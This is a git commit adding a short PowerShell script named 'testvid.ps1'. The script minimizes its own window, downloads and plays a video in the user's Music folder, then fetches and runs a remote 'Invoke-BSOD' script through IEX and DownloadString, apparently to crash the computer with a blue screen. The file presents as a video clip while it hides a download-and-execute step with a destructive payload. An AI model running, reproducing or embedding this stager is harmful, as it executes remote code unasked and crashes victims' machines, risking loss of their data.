3fd9e919e51d33d21500e408b6969a9fe184576b
YeetTheAnson <113901821+YeetTheAnson@users.noreply.github.com>
2024-04-01 23:20:41 +0800

    Add files via upload

---
+++ testvid.ps1
@@ -0,0 +1,26 @@
+# Function to minimize PowerShell window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+function Minimize-Window {
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    [Console.Window]::ShowWindow($consolePtr, 6) # Minimize
+}
+
+# Minimize PowerShell window
+Minimize-Window
+
+# Change directory to Music
+Set-Location -Path $env:USERPROFILE\Music
+
+# Download the video file
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"
+
+# Play the video
+Start-Process -FilePath "NiceComputer.mp4" -Wait
+
+# Run the next part of the script after video playback
+IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
